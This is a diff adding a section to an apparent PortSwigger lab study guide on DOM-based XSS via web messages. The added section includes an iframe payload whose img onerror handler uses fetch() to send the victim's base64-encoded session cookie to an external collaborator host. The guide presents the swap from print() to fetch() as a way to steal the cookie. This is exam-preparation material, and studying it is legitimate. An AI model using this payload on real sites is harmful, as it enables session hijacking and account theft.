@@ -73,6 +73,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 [Dom Invader](#dom-invader)  
 [DOM XSS JSON.parse web messages](#dom-xss-jsonparse-web-messages)  
 [DOM XSS AddEventListener JavaScript URL](#-dom-xss-addeventlistener-javascript-url)  
+[DOM XSS AddEventListener Ads Message](#dom-xss-addeventlistener-ads-message)  
 [Reflected DOM Cookie Stealer](#dom-cookie-stealer)  
 
 >DOM-based XSS vulnerabilities arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes code to a sink that supports dynamic code execution. Review the code to ***identify*** the **sources** and **sinks** that may lead to exploit, list of examples:  
@@ -228,7 +229,22 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
   
 [PortSwigger Lab: DOM XSS using web messages and a JavaScript URL](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)  
   
+### DOM XSS AddEventListener Ads Message  
 
+>In the source code we ***identify*** the call using ```addEventListener``` and element id ```ads``` reference.  
+
+[source-code-web-message-ads](images/source-code-web-message-ads.png)  
+
+>
+```html
+<iframe src="https://0ac5000103ef616dc349ce5000db0095.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://48abb8ntftpoxmevknc69pxuul0do3cs.oastify.com?collector=`+btoa(document.cookie))>','*')">
+```  
+
+>Replacing the Burp Lab payload ```print()``` with ```fetch()``` to steal the victim session cookie.  
+
+![AddEventListener Ads Message](images/AddEventListener-Ads-Message.png)  
+
+[PortSwigger Lab: DOM XSS using web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)  
 ### DOM Cookie Stealer  
 
 >In the **Search** function a Reflected XSS vulnerability is identified. The attacker then deliver an exploit link to victim with cookie stealing payload in a hosted **iframe** on their exploit server.  
